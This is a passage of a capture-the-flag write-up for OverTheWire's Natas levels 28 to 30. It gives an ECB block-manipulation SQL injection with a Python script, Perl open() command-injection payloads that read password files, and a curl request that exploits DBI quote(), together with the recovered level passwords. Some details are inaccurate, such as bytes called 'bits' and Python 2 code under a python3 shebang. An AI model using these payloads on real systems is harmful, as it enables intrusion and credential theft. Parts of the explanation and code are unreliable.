len:43  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qO07aCH08C+or7cG2FAueLryoz05hCROrrjmgZ2GSBKWg==
len:44  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qPOgqlVO2W4EoD7bTvykA9Hdf1QRP0GPSb2u39zS0HImQ==
len:45  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qMfdHFNdvzF1GTGoiHm7ZjkYiOhTZxCkbmHdbA/vHPU7diuUdfacbKwg9kZoNe4i5g=
len:46  cipher:G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLAhy3ui8kLEVaROwiiI6Oes5A4wo33m2XSYVHfWPfqo7OQOMKN95tl0mFR31j36qPs02+P2RZNQDVA5ElwfSflQlejQ9qtqvLA46HXHOA90Xt7rKZV8pijIekOP3pg1Ng=
...
```

Based cipher length, -> block size = 29 - 13 = 45 - 29 = 16 (bytes).

Then, we need brute-force to find byte offset.

```python
#!/usr/bin/python3
import requests
from urllib.parse import urlparse, unquote
import base64

url = "http://natas28.natas.labs.overthewire.org/index.php"
auth_username = "natas28"
auth_password = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"

block_size = 16
text = 'a' * 2 * block_size

pad = 'b'

for l in range(1, block_size):
    data = {"query": pad * l + text}
    r = requests.post(url, data=data, auth=(auth_username,auth_password))
    cipher = unquote(r.url.split('=')[-1])
    cipher = base64.b64decode(cipher).encode("hex")
    cipher_block = [cipher[i:i+block_size*2] for i in range(0, len(cipher), block_size*2)] #because 1 ascii byte = 2 hex bytes.

    latest = None
    for block in cipher_block:
        if block == latest:
            print('Offset:', l)
            print('cipher:', cipher_block)
            break
        latest = block
```

```
('Offset:', 10)
('cipher:', ['1be82511a7ba5bfd578c0eef466db59c', 'dc84728fdcf89d93751d10a7c75c8cf2', '5c805cbd29fb63e2ec53645325c7a896', 'b39038c28df79b65d26151df58f7eaa3', 'b39038c28df79b65d26151df58f7eaa3', '738a5ffb4a4500246775175ae596bbd6', 'f34df339c69edce11f6650bbced62702'])
```

Because we have 2 consecutive blocks `b39038c28df79b65d26151df58f7eaa3` in 4th and 5th index:

```
1be82511a7ba5bfd578c0eef466db59c -> ????????????????
dc84728fdcf89d93751d10a7c75c8cf2 -> ????????????????
5c805cbd29fb63e2ec53645325c7a896 -> ??????bbbbbbbbbb (b is padding)
b39038c28df79b65d26151df58f7eaa3 -> aaaaaaaaaaaaaaaa
b39038c28df79b65d26151df58f7eaa3 -> aaaaaaaaaaaaaaaa
738a5ffb4a4500246775175ae596bbd6 -> ????????????????
f34df339c69edce11f6650bbced62702 -> ????????????????
```

-> The payload plain text start from 16 - 10 + 1 = 7th byte of 3rd block with len(padding) = 10. We also have `prefix` and `postfix`.

```
1be82511a7ba5bfd578c0eef466db59c -> prefix
dc84728fdcf89d93751d10a7c75c8cf2 -> prefix
5c805cbd29fb63e2ec53645325c7a896 -> padding (??????bbbbbbbbbb)
block 4th                        -> maybe inject sql here
block 5th                        -> maybe inject sql here
...
738a5ffb4a4500246775175ae596bbd6 -> postfix
f34df339c69edce11f6650bbced62702 -> postfix
```

Attention, if payload = 12 * 'a' we have 5 blocks, but if payload = 13 * 'a' we have 6 blocks -> The last block contain 1 bits end and 15 bits padding (full padding).

```
1be82511a7ba5bfd578c0eef466db59c -> 16 bits start
dc84728fdcf89d93751d10a7c75c8cf2 -> 16 bits start
c0872dee8bc90b1156913b08a223a39e -> 6 bits start + 10 bits 'a'
ce82a9553b65b81280fb6d3bf2900f47 -> 2 bits 'a' + 14 bits end
75fd5044fd063d26f6bb7f734b41c899 -> 16 bits end
```

```
1be82511a7ba5bfd578c0eef466db59c -> 16 bits start
dc84728fdcf89d93751d10a7c75c8cf2 -> 16 bits start
c0872dee8bc90b1156913b08a223a39e -> 6 bits start + 10 bits 'a'
1f74714d76fcc5d464c6a221e6ed98e4 -> 3 bits 'a' + 13 bits end
6223a14d9c4291b98775b03fbc73d4ed -> 16 bits
d8ae51d7da71b2b083d919a0d7b88b98 -> 1 bits end + 15 bits padding
```

We will use SQL query `aaaaaaaaaaSELECT * FROM users WHERE 1 # aaaaa` to fill into cipher from block 4.

```
1be82511a7ba5bfd578c0eef466db59c -> 16 bits start
dc84728fdcf89d93751d10a7c75c8cf2 -> 16 bits start
c0872dee8bc90b1156913b08a223a39e -> 6 bits start + 10 bits 'a'
f79abe47a81b677079ea13336070464a -> SELECT * FROM us (16 chars <-> 16 bits)
b548369a817a2746d70614dc0dcf63d5 -> ers WHERE 1 # aa (16 chars <-> 16 bits, need padding 2 bits 'a')
1f74714d76fcc5d464c6a221e6ed98e4 -> 3 bits 'a' + 13 bits end (need padding 3 bits 'a')
6223a14d9c4291b98775b03fbc73d4ed -> 16 bits end
d8ae51d7da71b2b083d919a0d7b88b98 -> 1 bits end + 15 bits padding
```

We split cipher to get valid SQL query look like that:

```
f79abe47a81b677079ea13336070464a -> SELECT * FROM us (16 chars <-> 16 bits)
b548369a817a2746d70614dc0dcf63d5 -> ers WHERE 1 # aa (16 chars <-> 16 bits, need padding 2 bits 'a')
1f74714d76fcc5d464c6a221e6ed98e4 -> 3 bits 'a' + 13 bits end (need padding 3 bits 'a')
6223a14d9c4291b98775b03fbc73d4ed -> 16 bits end
d8ae51d7da71b2b083d919a0d7b88b98 -> 1 bits end + 15 bits padding
```

Decode cipher: `f79abe47a81b677079ea13336070464ab548369a817a2746d70614dc0dcf63d51f74714d76fcc5d464c6a221e6ed98e46223a14d9c4291b98775b03fbc73d4edd8ae51d7da71b2b083d919a0d7b88b98`

We get base64 url query:
`95q%2BR6gbZ3B56hMzYHBGSrVINpqBeidG1wYU3A3PY9UfdHFNdvzF1GTGoiHm7ZjkYiOhTZxCkbmHdbA%2FvHPU7diuUdfacbKwg9kZoNe4i5g%3D`

Request GET from: `http://natas28.natas.labs.overthewire.org/search.php/?query=95q%2BR6gbZ3B56hMzYHBGSrVINpqBeidG1wYU3A3PY9UfdHFNdvzF1GTGoiHm7ZjkYiOhTZxCkbmHdbA%2FvHPU7diuUdfacbKwg9kZoNe4i5g%3D`, we get response:

```
Notice: Undefined index: joke in /var/www/natas/natas28/search.php on line 92
```

We can see SQL query is working, but we need to change query a bit, look like `aaaaaaaaaaSELECT password AS joke from users WHERE 1 # aaaaaa`

```
1be82511a7ba5bfd578c0eef466db59c -> 16 bits start
dc84728fdcf89d93751d10a7c75c8cf2 -> 16 bits start
c0872dee8bc90b1156913b08a223a39e -> 6 bits start + 10 bits 'a'
5b8ac3d259f2d7ab9ba3fac39824b10a -> SELECT password 
d06f8990367940a4f964783862394d6b -> AS joke from use
c7ddf69db1b142b2caa52da41350d657 -> rs WHERE 1 # aaa
1f74714d76fcc5d464c6a221e6ed98e4 -> 3 bits 'a' + 13 bits end
6223a14d9c4291b98775b03fbc73d4ed -> 16 bits end
d8ae51d7da71b2b083d919a0d7b88b98 -> 1 bits end + 15 bits padding
```

Force split cipher to get valid query:

```
5b8ac3d259f2d7ab9ba3fac39824b10a -> SELECT password 
d06f8990367940a4f964783862394d6b -> AS joke from use
c7ddf69db1b142b2caa52da41350d657 -> rs WHERE 1 # aaa
1f74714d76fcc5d464c6a221e6ed98e4 -> 3 bits 'a' + 13 bits end
6223a14d9c4291b98775b03fbc73d4ed -> 16 bits end
d8ae51d7da71b2b083d919a0d7b88b98 -> 1 bits end + 15 bits padding
```

Decode cipher:
`5b8ac3d259f2d7ab9ba3fac39824b10ad06f8990367940a4f964783862394d6bc7ddf69db1b142b2caa52da41350d6571f74714d76fcc5d464c6a221e6ed98e46223a14d9c4291b98775b03fbc73d4edd8ae51d7da71b2b083d919a0d7b88b98`

We get base64 url query:
`W4rD0lny16ubo%2FrDmCSxCtBviZA2eUCk%2BWR4OGI5TWvH3fadsbFCssqlLaQTUNZXH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY`

Request GET from: `http://natas28.natas.labs.overthewire.org/search.php/?query=W4rD0lny16ubo%2FrDmCSxCtBviZA2eUCk%2BWR4OGI5TWvH3fadsbFCssqlLaQTUNZXH3RxTXb8xdRkxqIh5u2Y5GIjoU2cQpG5h3WwP7xz1O3YrlHX2nGysIPZGaDXuIuY`, we get response:

`airooCaiseiyee8he8xongien9euhe8b`

### natas29

This is perl command injection, open() function is vulnerable and can be used to execute commands, such as: `"| shutdown -r |"`. So we can send a payload: `?file=|ls` but it's not working.

Try change payload to: `?file|ls%0D%0A`, `?file|ls%0D`, `?file|ls%0A`, ... by using CRLF, we can see the response:

```
 index.html.tmpl index.pl index.pl.tmpl perl underground 2.txt perl underground 3.txt perl underground 4.txt perl underground 5.txt perl underground.txt
```

Next, we use payload: `?file|cat+index.pl%0A` and get the response:

```php
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

We need get the content of `/etc/natas_webpass/natas30`. If you use payload" `?file=|cat+/etc/natas_webpass/natas30%0A`, the response is `meeeeeep! (see in source code).

We can bypass by using payload: `?file=|cat+/etc/na%27%27tas_webpass/na%27%27tas30%0A`.

```
wie9iexae0Daihohv8vuu3cei9wahf0e
```

### natas30

```php
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}
```

The `quote` method is secure if used properly. However, if the data type is a non-string type like NUMERIC, then quote will pass its first argument through without any quoting. This constitutes an opportunity for SQL injection.

So, we will supply an array instead of a string, the first element of the array will be our injection string, the second element will be in the type of NUMERIC. Then the Perl back-end will pass our injection without any applying any filtering and our injection will work, look like: `Select * FROM users where username=natas31 and password='' or 1`.

```shell
curl -X POST -d "username=natas31" -d "password='' or 1" -d "password=2" --user natas30:wie9iexae0Daihohv8vuu3cei9wahf0e http://natas30.natas.labs.overthewire.org/index.pl
```

```
<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
win!<br>here is your result:<br>natas31hay7aecuungiuKaezuathuk9biin0pu1<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```